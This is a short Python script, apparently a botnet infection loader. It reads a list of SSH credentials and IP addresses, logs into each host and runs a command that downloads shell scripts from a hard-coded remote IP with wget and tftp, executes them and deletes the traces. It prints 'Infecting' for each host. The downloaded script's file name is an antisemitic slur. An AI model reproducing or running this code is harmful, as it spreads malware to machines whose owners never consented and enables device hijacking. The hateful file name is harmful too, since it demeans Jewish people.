#!/usr/bin/python

import sys, re, os, paramiko
from multiprocessing import Process

if len(sys.argv) < 2:
 sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")

paramiko.util.log_to_file("/dev/null")
cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://157.230.50.224/fuckjewishpeople.sh; chmod 777 fuckjewishpeople.sh; sh fuckjewishpeople.sh; tftp 157.230.50.224 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 157.230.50.224; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *"
r34d = open(str(sys.argv[1]),'a+')
print "\033[31mStarting Scan!\n"
def w0rk(username,password,ip):
 try:
  port = 22
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  ssh.connect(ip, port = port, username=username, password=password, timeout=3)
  print "\033[32m[\033[31m+\033[32m] Infecting:\x1b[31m "+ip+"\x1b[31m\n"
  ssh.exec_command(""+cmd+"")
  ssh.close()
 except:
  pass
for line in r34d:
 ip_1nfo = line.split(":")
 g0d = Process(target=w0rk, args=(ip_1nfo[0],ip_1nfo[1],ip_1nfo[2],))
 g0d.start()
 username=ip_1nfo[0]
 password=ip_1nfo[1]
 ip=ip_1nfo[2]
g0d.join()